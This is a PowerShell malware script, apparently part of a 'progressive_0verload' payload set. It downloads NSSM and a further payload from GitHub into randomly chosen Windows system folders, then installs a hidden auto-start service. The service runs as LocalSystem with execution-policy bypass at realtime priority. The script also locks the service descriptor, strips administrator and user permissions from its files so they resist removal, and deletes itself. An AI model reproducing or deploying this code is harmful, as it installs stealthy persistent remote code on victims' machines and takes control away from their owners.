param(
    [string]$rootPath,
    [string]$basePath
)
$paths = @(
    "$env:windir\system32\config\systemprofile\AppData\Local",
    "$env:windir\System32\WindowsPowerShell\v1.0\Modules",
    "$env:windir\System32\drivers\etc",
    "$env:windir\System32\LogFiles\WMI"
)
$curr = $MyInvocation.MyCommand.Path
$arch = (Get-CimInstance Win32_OperatingSystem).OSArchitecture

# $nssmUrl = "https://github.com/Soumyo001/progressive_0verload/raw/refs/heads/main/assets/nssmx64.exe"
if($arch -eq "64-bit"){
    $nssmUrl = "https://github.com/Soumyo001/progressive_0verload/raw/refs/heads/main/assets/nssmx64.exe"
}else{
    $nssmUrl = "https://github.com/Soumyo001/progressive_0verload/raw/refs/heads/main/assets/nssmx32.exe"
}
$nssmFolder = "$env:windir\system32\wbem\nssm"
$nssmexe = "$nssmFolder\nssm.exe"


if(($rootPath -eq $null) -or ($rootPath -eq "")){
    $rootPath = $paths[$(Get-Random -Minimum 0 -Maximum $paths.Length)]
    $rootPath = "$rootPath\root.ps1"
}

$scriptPath = $paths[$(Get-Random -Minimum 0 -Maximum $paths.Length)]
$scriptPath = "$scriptPath\root_mon_mon.ps1"

$serviceName = "MyRootmonmonService"
$exepath = "powershell.exe"
$arguments = "-noP -ep bypass -w hidden $scriptPath -rootPath '$rootPath' -basePath '$basePath'"
# $downloadPath = "$env:temp\nssm.zip"

if(-not(Test-Path -Path $nssmFolder -PathType Container)){
    New-Item -Path $nssmFolder -ItemType Directory -Force
}

if(-not(Test-Path -Path $nssmexe)){
    iwr -Uri $nssmUrl -OutFile $nssmexe
}

if(-not(Test-Path -Path $scriptPath -PathType Leaf)){
    iwr -Uri "https://github.com/Soumyo001/progressive_0verload/raw/refs/heads/main/payloads/root_mon_mon.ps1" -OutFile $scriptPath
}

# Remove-Item -Path $downloadPath -Force -Recurse -ErrorAction SilentlyContinue
# Remove-Item -Path "$env:temp\nssm-2.24" -Force -Recurse -ErrorAction SilentlyContinue

if(Get-Service -Name $serviceName -ErrorAction SilentlyContinue){
    & $nssmexe stop $serviceName
    & $nssmexe remove $serviceName confirm
}

& $nssmexe install $serviceName $exePath $arguments
& $nssmexe set $serviceName Start SERVICE_AUTO_START
& $nssmexe set $serviceName ObjectName "LocalSystem"
& $nssmexe set $serviceName AppExit Default Exit
& $nssmexe set $serviceName AppExit 0 Exit
& $nssmexe set $serviceName AppPriority REALTIME_PRIORITY_CLASS
& $nssmexe set $serviceName AppStdout "$env:userprofile\root_monmon_srv.log"
& $nssmexe set $serviceName AppStderr "$env:userprofile\root_monmon_srv.log.error"
& $nssmexe start $serviceName

Start-Sleep -Seconds 3
$user = (Get-CimInstance -ClassName Win32_ComputerSystem).UserName
$SDDL = "O:SYD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;SY)"
sc.exe sdset $serviceName $SDDL

takeown /F $scriptPath /A 2>&1 | Out-Null
icacls $scriptPath /inheritance:r /Q 2>&1 | Out-Null
icacls $scriptPath /grant:r "$($user):F" "NT AUTHORITY\SYSTEM:F" /Q 2>&1 | Out-Null
icacls $scriptPath /setowner "NT AUTHORITY\SYSTEM" /Q 2>&1 | Out-Null
icacls $scriptPath /remove "Administrators" "Users" "Authenticated Users" "Everyone" /Q 2>&1 | Out-Null
icacls $scriptPath /remove "BUILTIN\Administrators" "BUILTIN\Users" "Everyone" "NT AUTHORITY\Authenticated Users" /Q 2>&1 | Out-Null
icacls $scriptPath /remove "$user" /Q 2>&1 | Out-Null


takeown /F $nssmFolder /A /R /D Y 2>&1 | Out-Null
icacls $nssmFolder /inheritance:r /T /Q 2>&1 | Out-Null
icacls $nssmFolder /grant:r "$($user):(OI)(CI)F" "NT AUTHORITY\SYSTEM:(OI)(CI)F" /T /Q 2>&1 | Out-Null
icacls $nssmFolder /setowner "NT AUTHORITY\SYSTEM" /T /Q 2>&1 | Out-Null
icacls $nssmFolder /remove "Administrators" "Users" "Authenticated Users" "Everyone" /T /Q 2>&1 | Out-Null
icacls $nssmFolder /remove "BUILTIN\Administrators" "BUILTIN\Users" "Everyone" "NT AUTHORITY\Authenticated Users" /T /Q 2>&1 | Out-Null
icacls $nssmFolder /remove "$user" /T /Q 2>&1 | Out-Null

#attrib +h +s +r $nssmFolder
#attrib +h +s +r $scriptPath


Remove-Item -Path $curr -Force -ErrorAction SilentlyContinue